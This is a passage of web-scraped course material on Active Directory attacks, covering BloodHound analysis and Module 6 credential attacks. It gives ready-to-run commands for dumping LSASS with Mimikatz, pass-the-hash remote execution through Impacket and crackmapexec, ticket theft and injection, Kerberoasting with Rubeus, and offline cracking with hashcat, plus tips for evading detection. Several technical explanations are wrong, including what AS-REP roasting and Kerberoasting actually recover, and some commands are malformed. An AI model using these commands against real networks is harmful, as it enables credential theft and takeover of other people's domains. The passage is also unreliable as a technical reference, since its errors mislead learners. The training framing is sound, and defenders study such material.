tacker machine (your Kali VM, Windows analysis VM, etc.).</li>\n<li>Launch Neo4j Desktop.</li>\n<li>Click &quot;Add Graph&quot; -&gt; &quot;Create a Local Graph&quot;.</li>\n<li>Give it a name (e.g., &quot;MyADLab&quot;).</li>\n<li>Set a password (remember this!).</li>\n<li>Click &quot;Create&quot;.</li>\n<li>Once created, click the &quot;Start&quot; button next to your graph instance. Note the bolt address (usually <code>bolt://localhost:7687</code>).</li>\n</ul>\n<p><strong>Step 4: Launch the BloodHound GUI</strong></p>\n<ul>\n<li>Download the BloodHound GUI from the BloodHound GitHub releases page.</li>\n<li>Extract the BloodHound GUI files.</li>\n<li>Run the BloodHound executable (e.g., <code>BloodHound.exe</code> on Windows, <code>bloodhound</code> on Linux if installed via package manager or running from source).</li>\n</ul>\n<p><strong>Step 5: Connect to the Database and Import Data</strong></p>\n<ul>\n<li><p>When BloodHound GUI opens, it will prompt for connection details.</p>\n</li>\n<li><p><strong>Database Type:</strong> Neo4j</p>\n</li>\n<li><p><strong>Database URI:</strong> <code>bolt://localhost:7687</code> (or whatever Neo4j Desktop shows)</p>\n</li>\n<li><p><strong>Database Username:</strong> <code>neo4j</code></p>\n</li>\n<li><p><strong>Database Password:</strong> The password you set in Step 3.</p>\n</li>\n<li><p>Click &quot;Connect&quot;.</p>\n</li>\n<li><p>Once connected, click the &quot;Upload Data&quot; icon (up arrow) in the toolbar.</p>\n</li>\n<li><p>Browse to the <code>.json</code> or <code>.zip</code> file generated by <code>SharpHound</code> on your target host and transfered back to your attacker machine.</p>\n</li>\n<li><p>Select the file and click &quot;Open&quot;.</p>\n</li>\n<li><p>BloodHound will import the data. This might take some time depending on the size of the AD environment. Watch the status bar at the bottom.</p>\n</li>\n</ul>\n<p><strong>Step 6: Querying and Analyzing the Graph</strong></p>\n<p>Once the import is complete, you&#39;ll see statistics about the number of users, computers, groups, etc. Now the real fun begins!</p>\n<p>BloodHound has a search bar and a list of built-in queries in the left-hand pane. Let&#39;s explore the essential ones mentioned in the outline:</p>\n<ul>\n<li><p><strong>Shortest Path to Domain Admins:</strong></p>\n<ul>\n<li>Find this query in the &quot;Shortest Paths&quot; section.</li>\n<li>Click it. BloodHound will calculate and display the shortest path(s) from <em>any</em> node you own (or could potentially compromise) to the &quot;Domain Admins&quot; group.</li>\n<li><em>Interpretation:</em> This shows you the most direct routes. Each arrow represents a relationship (e.g., <code>AdminTo</code>, <code>MemberOf</code>, <code>HasSession</code>). Follow the path: &quot;If I compromise [Node A], I can get to [Node B] because of [Relationship], and from [Node B] I can get to [Node C] because of [Relationship], until I reach &#39;Domain Admins&#39;&quot;. This is your primary attack vector map!</li>\n</ul>\n</li>\n<li><p><strong>Kerberoastable Users:</strong></p>\n<ul>\n<li>Find this query in the &quot;Pre-built Queries&quot; section (or search for &quot;Kerberoastable&quot;).</li>\n<li>Click it. This query finds user accounts that have a Service Principal Name (SPN) registered and the account password is not set to &quot;Password Never Expires&quot;. These are ideal targets for the Kerberoasting attack (covered in Module 6).</li>\n<li><em>Interpretation:</em> These are user accounts (often service accounts) whose NTLM hash is used to encrypt their Kerberos service ticket. If you can request a ticket for their SPN, you get an encrypted blob that can be cracked offline <em>without</em> interacting further with the user or domain controller after the initial ticket request.</li>\n</ul>\n</li>\n<li><p><strong>AS-REP Roastable Users:</strong></p>\n<ul>\n<li>Find this query in the &quot;Pre-built Queries&quot; section (or search for &quot;AS-REP&quot;).</li>\n<li>Click it. This query finds user accounts where the &#39;Do not require Kerberos preauthentication&#39; flag is set.</li>\n<li><em>Interpretation:</em> These accounts don&#39;t perform the initial Kerberos preauthentication step (which uses a timestamp encrypted with the user&#39;s password hash). This means you can send an AS-REQ packet requesting a TGT for this user, and the KDC will return the user&#39;s TGT encrypted with their NTLM hash, without needing to know their password or perform the secure timestamp exchange. You can then crack this hash offline (covered in Module 6).</li>\n</ul>\n</li>\n<li><p><strong>Unconstrained Delegation:</strong></p>\n<ul>\n<li>Find this query in the &quot;Pre-built Queries&quot; section (or search for &quot;Unconstrained Delegation&quot;).</li>\n<li>Click it. This query finds computers or users configured for unconstrained Kerberos delegation.</li>\n<li><em>Interpretation:</em> If you compromise a computer or user with unconstrained delegation enabled, and a high-privileged user (like a Domain Admin) authenticates to that compromised principal, the compromised principal receives a forwardable TGT for the high-privileged user. This TGT can then be reused to authenticate as the high-privileged user elsewhere in the domain. This is a <em>very</em> powerful primitive if you can find and exploit it.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Exploring Other Queries:</strong></p>\n<ul>\n<li>Browse the &quot;Pre-built Queries&quot; for others like &quot;AdminTo&quot;, &quot;CanRDP&quot;, &quot;CanPSRemote&quot;, &quot;Contains&quot; (for OUs), etc.</li>\n<li>Use the search bar to find specific users, computers, or groups. Right-click on a node to explore its relationships (&quot;Get All Paths To/From Here&quot;).</li>\n<li>Learn the Cypher query language (Neo4j&#39;s query language) to write your own custom queries for specific scenarios or relationships.</li>\n</ul>\n<hr>\n<h3><strong>5.6 OpSec Considerations for AD Enumeration</strong></h3>\n<p>While essential, AD enumeration isn&#39;t silent. Be mindful of the noise you&#39;re creating:</p>\n<ul>\n<li><strong>Native Tools (<code>net</code>, <code>dsquery</code>, <code>nltest</code>):</strong> These execute standard Windows binaries. Their activity might appear in command-line logging or process creation logs. <code>nltest</code> queries specifically talk to Domain Controllers and can be logged there.</li>\n<li><strong>PowerShell (<code>Get-AD*</code>, <code>PowerView</code>):</strong> PowerShell activity is heavily logged if ScriptBlock Logging and Module Logging are enabled (which they should be in well-defended networks). <code>PowerView</code> functions often make direct LDAP queries, which can be monitored on Domain Controllers.</li>\n<li><strong>SharpHound:</strong> This tool makes a large number of LDAP and MSRPC (for sessions/local admins) queries to Domain Controllers and potentially other machines. This can be detected by monitoring tools looking for unusual query volumes or patterns from a single host. Transferring the <code>SharpHound.exe</code> executable itself can also be detected by AV/EDR. Transferring the large output <code>.json</code>/<code>.zip</code> file back to your machine is another potential detection point.</li>\n</ul>\n<p><strong>Mitigation:</strong></p>\n<ul>\n<li>Use credentials appropriate for the level of access you need.</li>\n<li>Understand the logging capabilities of the target environment.</li>\n<li>Consider using less noisy collection methods in SharpHound initially (<code>Default</code> often relies more on LDAP, which might be less monitored than MSRPC or session enumeration in some environments).</li>\n<li>Perform collection during times of high network activity if stealth is paramount (though this is never guaranteed).</li>\n<li>Use obfuscation for PowerShell scripts if necessary.</li>\n<li>Be prepared for detection and have a plan.</li>\n</ul>\n<hr>\n<h3><strong>Module 5 Summary</strong></h3>\n<p>We&#39;ve covered a massive amount of ground! We started by revisiting core AD concepts from an attacker&#39;s viewpoint. We learned how to use built-in Windows commands to gather basic AD information. We then stepped up our game with PowerShell, leveraging the <code>ActiveDirectory</code> module and the powerful <code>PowerView</code> functions for more detailed and flexible</p>\n\n                </div>\n             </div>\n         ",
    "module-6": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 6: module_6</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome back! We&#39;ve navigated the initial host, dug deep into local enumeration and PE, and even started moving around the network. Now, we arrive at a goldmine for attackers: <strong>credentials</strong>.</p>\n<p>Module 6 is where we elevate our understanding of authentication and learn how to leverage harvested credentials, hashes, and tickets in sophisticated ways to unlock further access and pave the way to domain dominance. This is where the real power plays begin!</p>\n<p>As always, everything we discuss is for ethical red teaming and security testing <em>within your own lab environment</em>. Understanding these techniques is crucial for building robust defenses. Let&#39;s dive in!</p>\n<hr>\n<h2><strong>Module 6: Advanced Credential Attacks</strong></h2>\n<h3><strong>Module Objective:</strong></h3>\n<p>Deepen your understanding of NTLM and Kerberos authentication and execute sophisticated credential-based attacks to obtain hashes, tickets, and gain access to resources within an Active Directory environment.</p>\n<h3><strong>Essential Subtopics:</strong></h3>\n<ol>\n<li>In-depth look at NTLM authentication (challenges, responses, hash formats).</li>\n<li>Pass-the-Hash (PtH) techniques and tools.</li>\n<li>Understanding Kerberos authentication (TGT, TGS, SPNs).</li>\n<li>Pass-the-Ticket (PtT) techniques.</li>\n<li>Overpass-the-Hash (PtT using NTLM hash to request a TGT).</li>\n<li>Kerberoasting: Identifying Service Principal Names (SPNs), requesting service tickets, and offline cracking.</li>\n<li>AS-REP Roasting: Identifying users with &#39;Do not require Kerberos preauthentication&#39; and requesting their initial authentication hash.</li>\n<li>Leveraging tools like Mimikatz, Rubeus, Impacket.</li>\n<li>Defenses and detection methods for these attacks.</li>\n<li>Case Study: How credential attacks are used in major breaches.</li>\n</ol>\n<hr>\n<h3><strong>6.1 Authentication Deep Dive (Relevant to Attacks)</strong></h3>\n<p>Before we can exploit authentication mechanisms, we need a slightly deeper understanding of how they <em>actually work</em> in a Windows and Active Directory context. We&#39;ll focus on the aspects critical for the attacks we&#39;re about to learn.</p>\n<h4><strong>6.1.1 NTLM Authentication</strong></h4>\n<p>NTLM (NT LAN Manager) is an older authentication protocol but is still widely used, especially for local authentication and in scenarios where Kerberos isn&#39;t available or configured. It&#39;s a challenge/response protocol.</p>\n<ul>\n<li><p><strong>The Flow (Simplified):</strong></p>\n<ol>\n<li>Client sends a negotiation message to the server.</li>\n<li>Server sends back a challenge (a random nonce).</li>\n<li>Client encrypts the challenge using the <em>hash</em> of the user&#39;s password and sends the encrypted challenge back as the response.</li>\n<li>Server (or a Domain Controller it trusts) retrieves the user&#39;s password hash, encrypts the original challenge with it, and compares the result to the client&#39;s response.</li>\n<li>If they match, authentication succeeds.</li>\n</ol>\n</li>\n<li><p><strong>Why Pass-the-Hash Works:</strong> Notice step 3. The client <em>never</em> sends the actual password. It only needs the <em>hash</em> of the password to calculate the correct response to the server&#39;s challenge. If an attacker obtains this hash, they can perform the same calculation and authenticate as the user <em>without ever knowing the original password</em>. This is the fundamental principle behind Pass-the-Hash.</p>\n</li>\n<li><p><strong>NTLM Hashes:</strong> The hash used is typically the NTLM hash (MD4 of the UTF-16 representation of the password). Tools like Mimikatz often dump this hash directly from memory (LSASS). You&#39;ll commonly see them represented as 32 hexadecimal characters.</p>\n<ul>\n<li>Example: <code>518b05f361ad763729324a0189a73422</code> (This is <em>not</em> a real hash, just format example).</li>\n</ul>\n</li>\n</ul>\n<h4><strong>6.1.2 Kerberos Authentication</strong></h4>\n<p>Kerberos is the <em>default</em> and preferred authentication protocol in Active Directory domains. It&#39;s more secure than NTLM (when configured correctly) and relies on a trusted third party, the Key Distribution Center (KDC), which is typically a Domain Controller (DC). Kerberos uses &quot;tickets&quot; to grant access.</p>\n<ul>\n<li><p><strong>Key Components:</strong></p>\n<ul>\n<li><strong>Client:</strong> The user or service requesting access.</li>\n<li><strong>Server:</strong> The resource or service the client wants to access.</li>\n<li><strong>KDC (Key Distribution Center):</strong> Consists of two parts:<ul>\n<li><strong>AS (Authentication Service):</strong> Issues Ticket Granting Tickets (TGTs).</li>\n<li><strong>TGS (Ticket Granting Service):</strong> Issues Service Tickets (TGSs).</li>\n</ul>\n</li>\n<li><strong>Principal:</strong> An entity that can be authenticated (user, computer, service). Each principal has a secret key (derived from their password/machine account password).</li>\n<li><strong>Realms:</strong> Kerberos domains (in AD, the domain name is the realm).</li>\n</ul>\n</li>\n<li><p><strong>The Flow (Simplified - Requesting a Service Ticket):</strong></p>\n<ol>\n<li><strong>AS-REQ (Authentication Service Request):</strong> Client sends its username to the AS, requesting a TGT. The request is encrypted with the client&#39;s secret key (password hash).</li>\n<li><strong>AS-REP (Authentication Service Reply):</strong> AS verifies the client&#39;s identity. If valid, it generates a TGT. The TGT contains information about the client and is encrypted with the KDC&#39;s secret key (the <code>krbtgt</code> account hash). The AS sends this TGT back to the client, encrypted with the client&#39;s secret key. <em>The client can now decrypt the outer layer to get the TGT, but cannot read the contents inside (encrypted with <code>krbtgt</code> hash).</em></li>\n<li><strong>TGS-REQ (Ticket Granting Service Request):</strong> When the client wants to access a specific service (e.g., a file share on a server), it sends the TGT (obtained in step 2) to the TGS, requesting a Service Ticket for that service&#39;s Principal (identified by its SPN).</li>\n<li><strong>TGS-REP (Ticket Granting Service Reply):</strong> TGS verifies the TGT (using its <code>krbtgt</code> key). If valid, it generates a Service Ticket for the requested service. This Service Ticket is encrypted with the <em>service principal&#39;s</em> secret key (the hash of the user account or computer account the SPN is associated with). The TGS sends this Service Ticket back to the client, encrypted with a session key shared between the client and TGS (which was included inside the TGT).</li>\n<li><strong>AP-REQ (Application Request):</strong> Client sends the Service Ticket (obtained in step 4) to the target Server/Service.</li>\n<li><strong>AP-REP (Application Reply):</strong> Server receives the Service Ticket, decrypts it using its own secret key (the service principal&#39;s hash). If successful, it verifies the client&#39;s identity and grants access.</li>\n</ol>\n</li>\n<li><p><strong>Why Pass-the-Ticket Works:</strong> If an attacker obtains a valid TGT or TGS ticket (e.g., by dumping the credential cache from LSASS), they can inject it into their own session. The operating system&#39;s Kerberos implementation will then present this ticket when attempting to access resources, allowing the attacker to authenticate as the user the ticket belongs to, <em>without knowing the password or hash</em>.</p>\n</li>\n<li><p><strong>Why Kerberoasting Works:</strong> Look at step 4. The Service Ticket is encrypted with the <em>service principal&#39;s secret key</em> (their NTLM hash). If a service principal is associated with a <em>user</em> account (common for custom applications, SQL services, etc.), and an attacker can obtain that service ticket (which any authenticated domain user can request for <em>any</em> SPN), they can attempt to decrypt the ticket offline using the service account&#39;s hash. This is a direct path to obtaining the service account&#39;s NTLM hash for offline cracking.</p>\n</li>\n<li><p><strong>Why AS-REP Roasting Works:</strong> Look at step 1. The AS-REQ is normally encrypted with the user&#39;s secret key (hash). However, if the &#39;Do not require Kerberos preauthentication&#39; flag is set for a user, the initial AS-REQ is sent <em>without</em> this encryption step. The AS-REP returned contains a timestamp encrypted with the user&#39;s hash. An attacker capturing this exchange can extract the encrypted timestamp and crack it offline to recover the user&#39;s NTLM hash.</p>\n</li>\n<li><p><strong>Service Principal Names (SPNs):</strong> These are unique identifiers for service instances. They are associated with a computer account (e.g., <code>HOST/server.domain.com</code>) or a user account (e.g., <code>MSSQLSvc/db.domain.com:1433</code>). When a client wants to access a service, it asks the KDC for a service ticket for that service&#39;s SPN. The KDC looks up which account the SPN is registered to and encrypts the service ticket with <em>that account&#39;s</em> password hash. This is the Achilles&#39; heel Kerberoasting exploits.</p>\n</li>\n</ul>\n<hr>\n<h3><strong>6.2 Pass-the-Hash (PtH)</strong></h3>\n<p>PtH is a classic technique that exploits the NTLM protocol&#39;s reliance on the password hash rather than the password itself. If you have a user&#39;s NTLM hash, you can authenticate to resources that accept NTLM authentication as that user.</p>\n<ul>\n<li><p><strong>Concept:</strong> Authenticate using the user&#39;s NTLM hash instead of their plaintext password.</p>\n</li>\n<li><p><strong>Requirements:</strong> The user&#39;s NTLM hash and access to a system or tool that can perform PtH. The target system must support NTLM authentication.</p>\n</li>\n<li><p><strong>Common Targets:</strong> File shares (SMB/CIFS), WMI, PsExec, SQL databases, RDP (in some configurations).</p>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>Mimikatz:</strong> The go-to tool for Windows credential manipulation.</p>\n<ul>\n<li>First, you often need to dump credentials, including hashes, from LSASS.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Requires administrator privileges on the target host\n# Make sure to download and execute Mimikatz carefully, AV will flag it!\n# Method 1: Direct execution (often blocked by AV/EDR)\n# mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit\n\n# Method 2: Load into PowerShell (requires admin)\n# Import-Module .\\Invoke-Mimikatz.ps1\n# Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;&#39;\n</code></pre>\n<ul>\n<li>Once you have hashes (e.g., <code>UserA::DOMAIN:LMHASH:NTHASH:::</code>), you can use the <code>sekurlsa::pth</code> command.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Example: Using Mimikatz to launch a command prompt with PtH\n# Replace DOMAIN, UserA, and NTHASH with harvested values\nmimikatz.exe &quot;sekurlsa::pth /user:UserA /domain:DOMAIN /ntlm:NTHASH /run:cmd.exe&quot; exit\n</code></pre>\n<p>This will pop a new command prompt running under the context of <code>DOMAIN\\UserA</code>, authenticated via PtH using only the NTLM hash. You can then use this prompt to access resources that <code>UserA</code> has access to (e.g., <code>dir \\\\server\\share</code>).</p>\n</li>\n<li><p><strong>Impacket (Python Toolkit):</strong> Excellent cross-platform tools for interacting with Windows services, often supporting PtH. Run these from your attacker machine (e.g., Kali).</p>\n<ul>\n<li><strong><code>psexec.py</code>:</strong> Executes commands remotely (like Sysinternals PsExec).</li>\n</ul>\n<pre><code class=\"language-bash\"># Authenticate using hash to run cmd.exe on TargetServer\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\npsexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\n# Or if you don&#39;t know the domain, sometimes just user@target is enough\n# psexec.py UserA@TargetServer -hashes :NTHASH\n</code></pre>\n<ul>\n<li><strong><code>wmiexec.py</code>:</strong> Executes commands remotely via WMI. Often less detected than PsExec.</li>\n</ul>\n<pre><code class=\"language-bash\"># Authenticate using hash to run cmd.exe on TargetServer via WMI\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\nwmiexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\n</code></pre>\n<ul>\n<li><strong><code>smbexec.py</code>:</strong> Executes commands remotely via SMB (creates a service like PsExec but can be stealthier).</li>\n</ul>\n<pre><code class=\"language-bash\"># Authenticate using hash to run cmd.exe on TargetServer via SMB\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\nsmbexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\n</code></pre>\n<ul>\n<li><strong>Accessing File Shares:</strong> You can also use tools like <code>smbclient.py</code> or <code>crackmapexec</code> with hashes.</li>\n</ul>\n<pre><code class=\"language-bash\"># List shares on TargetServer using crackmapexec with hash\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\ncrackmapexec smb TargetServer -d DOMAIN -u UserA -H NTHASH\n\n# Access a specific share using smbclient.py with hash\n# Replace DOMAIN, UserA, NTHASH, TargetServer, and ShareName\nsmbclient.py DOMAIN/UserA@TargetServer -hashes :NTHASH -share ShareName\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Successful NTLM authentication events (Event ID 4776 on DCs, 4624 on target host) will be logged. The logon type might be different than interactive.</li>\n<li>Network traffic will show NTLMv2 challenge/response, but the actual password isn&#39;t sent.</li>\n<li>Using tools like PsExec creates services on the target host, which can be noisy. WMI and SMBExec might be quieter.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.3 Pass-the-Ticket (PtT)</strong></h3>\n<p>PtT leverages stolen Kerberos tickets (TGTs or TGSs) to authenticate to resources. Since the ticket itself represents proof of authentication, you don&#39;t need the password or hash.</p>\n<ul>\n<li><p><strong>Concept:</strong> Authenticate using a valid Kerberos ticket instead of a password or hash.</p>\n</li>\n<li><p><strong>Requirements:</strong> A valid Kerberos ticket file (<code>.kirbi</code> extension is common) and access to a system where you can inject the ticket into the current user&#39;s session/credential cache.</p>\n</li>\n<li><p><strong>Common Targets:</strong> Any service or resource that uses Kerberos authentication (most domain resources by default).</p>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>Mimikatz:</strong> Again, a primary tool. You first need to extract tickets from memory.</p>\n<pre><code class=\"language-powershell\"># Requires administrator privileges\n# Dump Kerberos tickets from LSASS\n# mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit\n# This exports tickets to .kirbi files in the current directory\n</code></pre>\n<ul>\n<li>Once you have <code>.kirbi</code> files (e.g., <code>TGT_UserA@DOMAIN.TGT.kirbi</code>, <code>TGS_UserA@DOMAIN_Service@Server.TGS.kirbi</code>), you can inject them.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Inject a TGT ticket (allows requesting new service tickets)\n# Replace path_to_ticket.kirbi\nmimikatz.exe &quot;kerberos::ptt path_to_ticket.kirbi&quot; exit\n\n# Inject a TGS ticket (allows accessing the specific service/resource it&#39;s for)\n# Replace path_to_ticket.kirbi\nmimikatz.exe &quot;kerberos::ptt path_to_ticket.kirbi&quot; exit\n</code></pre>\n<ul>\n<li>After injecting a ticket, you can verify it using <code>klist</code> in a command prompt.</li>\n</ul>\n<pre><code class=\"language-cmd\">klist\n</code></pre>\n<p>You should see the injected ticket listed. You can then access resources as that user.</p>\n</li>\n<li><p><strong>Rubeus:</strong> A C# Kerberos interaction toolkit, often preferred for its flexibility and less signature-based detection compared to Mimikatz&#39;s executable.</p>\n<ul>\n<li>Dump tickets using Rubeus (from a privileged shell):</li>\n</ul>\n<pre><code class=\"language-powershell\"># Requires administrator privileges\n# Download Rubeus.exe\n# Execute Rubeus from PowerShell\n.\\Rubeus.exe dump /luid:0 # Dump tickets for the current logon session (often 0 for SYSTEM)\n.\\Rubeus.exe dump /service:krbtgt # Dump the krbtgt ticket (very powerful!)\n</code></pre>\n<ul>\n<li>Inject tickets using Rubeus:</li>\n</ul>\n<pre><code class=\"language-powershell\"># Inject a ticket from a .kirbi file\n.\\Rubeus.exe ptt /ticket:path_to_ticket.kirbi\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>The <code>klist</code> command run by the OS shows the injected tickets.</li>\n<li>Successful Kerberos authentication events (Event ID 4768 - TGT request, 4769 - TGS request, 4624 - Logon) will be logged on DCs and target hosts. The source of the request might be unusual (e.g., a host not typically used by that user).</li>\n<li>Less network noise initially compared to PtH, as the ticket is reused.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.4 Overpass-the-Hash (OtH)</strong></h3>\n<p>OtH is a technique to obtain a Kerberos TGT using an NTLM hash. This is useful when you have a hash but prefer to use Kerberos for subsequent lateral movement or resource access, or when NTLM authentication might be blocked or more heavily monitored.</p>\n<ul>\n<li><p><strong>Concept:</strong> Use a user&#39;s NTLM hash to request a Kerberos TGT from the KDC.</p>\n</li>\n<li><p><strong>Requirements:</strong> The user&#39;s NTLM hash (or AES key, which is even better but harder to get), the user&#39;s SID, the domain name, and the NTLM hash of the <code>krbtgt</code> account (or its AES key). <em>Wait, getting the <code>krbtgt</code> hash requires domain admin or equivalent!</em> Yes, OtH often comes <em>after</em> some level of compromise or in specific scenarios. However, there are variations where you might request a TGT for a <em>different</em> user using a hash you <em>do</em> have. The core idea is using a hash to <em>request</em> a ticket. A common use case is using a user hash to request their TGT, then using that TGT for PtT.</p>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>Mimikatz:</strong> Can generate tickets using hashes or keys.</p>\n<pre><code class=\"language-powershell\"># This is often used for Golden Ticket (M7), but the principle applies\n# Requesting a TGT using NTLM hash (requires krbtgt hash or key for full forge)\n# More commonly used for Golden Ticket forging (any user TGT)\n# mimikatz.exe &quot;kerberos::golden /user:UserA /domain:DOMAIN.LOCAL /sid:S-1-5-21-...&quot; /krbtgt:krbtgt_NTHASH /ticket:outh_UserA.kirbi&quot; exit\n# Then use kerberos::ptt outh_UserA.kirbi\n</code></pre>\n<ul>\n<li><em>Correction:</em> While Mimikatz <em>can</em> forge tickets, the simpler OtH concept (using a hash to <em>request</em> a legitimate TGT from the KDC) is often done via Rubeus or Impacket. Mimikatz&#39;s <code>kerberos::ptt</code> can inject a ticket <em>you already have</em>. The &quot;Overpass&quot; part is the act of <em>requesting</em> the ticket with the hash.</li>\n</ul>\n</li>\n<li><p><strong>Rubeus:</strong> Excellent for requesting tickets.</p>\n<pre><code class=\"language-powershell\"># Request a TGT for UserA using their NTLM hash\n# Requires UserA&#39;s SID (can get via AD enumeration or whoami /user)\n.\\Rubeus.exe asktgt /user:UserA /domain:DOMAIN.LOCAL /rc4:UserA_NTHASH /ptt\n# The /ptt flag automatically injects the resulting TGT\n</code></pre>\n<p>This command tells Rubeus to act as UserA, use their NTLM hash (<code>/rc4:</code>) to encrypt the AS-REQ timestamp, send it to the DC, receive the AS-REP (containing the encrypted TGT), and inject it. You now have UserA&#39;s TGT via hash.</p>\n</li>\n<li><p><strong>Impacket:</strong> <code>getTGT.py</code> can also request TGTs using hashes.</p>\n<pre><code class=\"language-bash\"># Request TGT for UserA using NTLM hash and save to UserA.ccache\n# Replace DOMAIN, UserA, UserA_NTHASH, DC_IP\ngetTGT.py DOMAIN/UserA@DC_IP -hashes :UserA_NTHASH -dc-ip DC_IP\n# Output will be UserA.ccache - this is a ticket file format.\n# You can then use impacket tools with -k flag and KB5-CCACHE env var,\n# or convert to .kirbi and use Mimikatz/Rubeus ptt.\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>The KDC will log a successful AS-REQ (Event ID 4768) for the user. The authentication method might be logged (e.g., NTLM hash used for Kerberos authentication).</li>\n<li>Less noisy than PtH on the network <em>after</em> the TGT is obtained, as subsequent access uses Kerberos tickets.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.5 Kerberoasting</strong></h3>\n<p>This is a powerful technique to obtain password hashes of service accounts that are associated with user accounts (not computer accounts) by requesting and cracking their service tickets offline.</p>\n<ul>\n<li><p><strong>Concept:</strong> Request a Kerberos Service Ticket (TGS) for a Service Principal Name (SPN) registered to a <em>user</em> account. The TGS is encrypted with the target user account&#39;s NTLM hash. Capture the ticket and crack the hash offline.</p>\n</li>\n<li><p><strong>Requirements:</strong> An authenticated domain user session (even low privilege).</p>\n</li>\n<li><p><strong>Why it works:</strong> Any authenticated domain user can request a service ticket for <em>any</em> registered SPN in the domain. If that SPN maps to a user account, the ticket is encrypted with that user&#39;s password hash.</p>\n</li>\n<li><p><strong>The Steps:</strong></p>\n<ol>\n<li><strong>Enumerate SPNs:</strong> Find SPNs registered to user accounts.</li>\n<li><strong>Request Service Tickets:</strong> Request TGS tickets for the identified SPNs.</li>\n<li><strong>Export Tickets:</strong> Save the requested tickets in a crackable format.</li>\n<li><strong>Crack Hashes:</strong> Use a password cracker (Hashcat, John the Ripper) offline to recover the plaintext passwords from the NTLM hashes extracted from the tickets.</li>\n</ol>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>PowerView (PowerSploit):</strong> Excellent PowerShell script for AD enumeration.</p>\n<pre><code class=\"language-powershell\"># Requires an active domain session (run from a domain-joined host or via remoting)\n# Import PowerView.ps1\n# Find all domain users with SPNs\nGet-DomainUser -SPN | Select-Object Name, SamAccountName, ServicePrincipalNames\n</code></pre>\n<p>This command lists users and their SPNs. Look for SPNs that seem unusual or are associated with user accounts you want to target.</p>\n</li>\n<li><p><strong>Rubeus:</strong> Can automate the entire process of requesting and formatting tickets for cracking.</p>\n<pre><code class=\"language-powershell\"># Requires an active domain session\n# Download Rubeus.exe\n# Execute Rubeus to perform Kerberoasting\n.\\Rubeus.exe kerberoast\n</code></pre>\n<p>This command performs the enumeration, requests tickets for found SPNs, and outputs the ticket data in a format suitable for Hashcat or John (hash mode 13100).</p>\n</li>\n<li><p><strong>Impacket:</strong> <code>GetUserSPNs.py</code> script.</p>\n<pre><code class=\"language-bash\"># Run from attacker machine (e.g., Kali)\n# Requires valid domain credentials (any domain user is usually enough)\n# Replace DOMAIN, User, Password, DC_IP\nGetUserSPNs.py DOMAIN/User:Password -dc-ip DC_IP\n# Or using a hash if you have one (PtH style)\n# GetUserSPNs.py DOMAIN/User@DC_IP -hashes :NTHASH -dc-ip DC_IP\n</code></pre>\n<p>This script also enumerates, requests, and outputs crackable hashes.</p>\n</li>\n<li><p><strong>Hashcat/John the Ripper:</strong> For offline cracking of the obtained hashes.</p>\n<ul>\n<li>Hashcat mode 13100 for Kerberoast hashes.</li>\n</ul>\n<pre><code class=\"language-bash\"># Assuming Rubeus/Impacket outputted to a file named hashes.txt\n# Replace /path/to/wordlist.txt\nhashcat -m 13100 hashes.txt /path/to/wordlist.txt --force # --force if run in VM/unsupported env\n</code></pre>\n<ul>\n<li>John the Ripper can often auto-detect the format if you use the <code>--format=krb5tgs</code> flag or just <code>john --wordlist=... hashes.txt</code>.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Multiple TGS-REQ requests from a single user/host in a short period (Event ID 4769 on DCs). This is a primary detection vector.</li>\n<li>Requests for unusual or a large number of SPNs.</li>\n<li>Network traffic analysis might show unusual Kerberos activity.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.6 AS-REP Roasting</strong></h3>\n<p>AS-REP Roasting targets users with the &#39;Do not require Kerberos preauthentication&#39; flag set.</p>\n<ul>\n<li><strong>Concept:</strong> Identify users with the <code>DONT_REQ_PREAUTH</code> user account control flag. For these users, the initial Kerberos authentication request (AS-REQ) is not encrypted with their password hash. Requesting an AS-REQ for such a user allows capturing a portion of the response (the encrypted timestamp) that can be cracked offline to recover their NTLM hash.</li>\n<li><strong>Requirements:</strong> An authenticated domain user session (even low privilege).</li>\n<li><strong>Why it works:</strong> The vulnerability is in the specific user account setting (`</li>\n</ul>\n\n                </div>\n             </div>\n         ",
